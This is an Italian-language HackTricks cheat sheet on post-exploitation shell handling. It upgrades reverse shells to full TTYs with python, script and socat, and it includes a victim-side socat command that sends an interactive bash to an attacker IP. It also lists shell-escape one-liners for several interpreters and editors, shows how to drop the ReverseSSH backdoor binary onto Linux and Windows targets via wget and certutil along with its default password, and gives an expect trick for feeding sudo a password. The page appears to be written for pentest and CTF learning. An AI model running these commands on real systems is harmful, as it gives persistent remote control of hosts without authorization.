# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Nota che la shell impostata nella variabile `SHELL` **deve** essere **elencata all'interno di** _**/etc/shells**_, altrimenti verrà visualizzato `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Inoltre, tieni presente che i prossimi snippet funzionano solo in bash. Se ti trovi in una zsh, passa a bash prima di ottenere la shell eseguendo `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Puoi ottenere il **numero** di **righe** e **colonne** eseguendo **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Avviare shell**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Un modo pratico per ottenere **accesso interattivo alla shell**, oltre a **trasferimenti di file** e **port forwarding**, consiste nel caricare sul target il server ssh staticamente linked [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Di seguito è riportato un esempio per `x86` con binari compressi con upx. Per altri binari, consulta la [pagina delle release](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Preparati localmente a ricevere la richiesta di port forwarding ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Target Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) target Windows 10 (per le versioni precedenti, consulta il [readme del progetto](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Se la richiesta di port forwarding di ReverseSSH è andata a buon fine, ora dovresti poter effettuare l'accesso con la password predefinita `letmeinbrudipls` nel contesto dell'utente che esegue `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) esegue automaticamente l'upgrade delle reverse shell Linux a TTY, gestisce le dimensioni del terminale, registra tutto e molto altro. Inoltre, fornisce il supporto readline per le shell Windows.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Nessun TTY

Se per qualche motivo non riesci a ottenere un full TTY, **puoi comunque interagire con i programmi** che prevedono l'inserimento di dati da parte dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Riferimenti

- [1] [ReverseSSH - Server ssh collegato staticamente con funzionalità di reverse shell per CTF e simili](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Gestore di shell che automatizza alcune operazioni per semplificare la vita](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
